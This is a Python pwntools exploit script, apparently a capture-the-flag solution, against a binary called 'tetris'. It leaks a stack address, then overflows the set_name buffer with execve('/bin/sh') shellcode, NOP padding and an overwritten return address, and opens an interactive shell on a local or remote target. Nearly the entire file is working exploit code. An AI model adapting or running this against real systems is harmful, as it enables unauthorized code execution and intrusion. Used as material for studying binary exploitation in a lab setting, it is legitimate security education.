from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "tetris").resolve().__str__()
# b *0x40131e
# b *loop+85
# b *loop+16
# b *main+177
gdb_script = """
b *set_name+59
b *set_name+76
b *set_name+105
c
"""
SYSCALL = 0x3B
binsh = u64(b"/bin/sh\x00")
myShellCode = f"""
    mov rbx, {binsh}
    xor rsi, rsi
    xor rdx, rdx
    mov rax, {SYSCALL}
    push rbx
    mov rdi, rsp
    syscall
"""

SHELL_CODE = asm(myShellCode, arch="amd64", os="linux")
print(f"ShellCode is: {SHELL_CODE}")
print(f"ShellCode is: \n{disasm(SHELL_CODE)}")
print(f"ShellCode len is: {len(SHELL_CODE)}")


frame_size = 0x70  # 1536
rbp = 8
leak_size = 84 - 1


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
io.recvuntil("$ ")
print("____________________________________")

# Leak the address
io.sendline("p")
res = io.recvuntil(":")
print(res)
print(f"Sending: {b"A" * (84 - 1)}")
io.sendline((84 - 1) * b"A")
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

io.recvline()
io.recvuntil("offset ")
leak_addr = io.recvline().strip().decode("ascii")
print(f"Leaked address : {leak_addr}")
leak_addr_int = int(leak_addr, base=16)


# TODO: byte align!
#     Leaked address   Buff in setname
# >>> 0x7fff7d623ea0 - 0x7fff7d623e30
# 112
# >>> hex(0x7fff7d623ea0 - 0x7fff7d623e30)
delta = 0x70
desired_jump = leak_addr_int - delta

# buff size is stackframe size!
# Bytes required to get to RIP
STACK_FRAME_SIZE_SETNAME = 0x30
RIP = 8
delta_RSP_RBP_setname = STACK_FRAME_SIZE_SETNAME + RIP + 8 + 8 + 8  # 48 bytes

shellcode_addr = p64(desired_jump, endianness="little")
print(f"Shellcode address: {hex(desired_jump)}")

NOP = b"\x90"
PADDING = NOP * (STACK_FRAME_SIZE_SETNAME - len(SHELL_CODE) + 8)

payload = SHELL_CODE + PADDING + shellcode_addr

print("____________________________________")
print(f"Sending shellcode payload: {payload}")
io.sendline("s")
io.sendline(payload)
io.recvuntil("My name is s/jeff/")
res = io.recvline()
# print(f"Results are: {res}")


io.interactive()
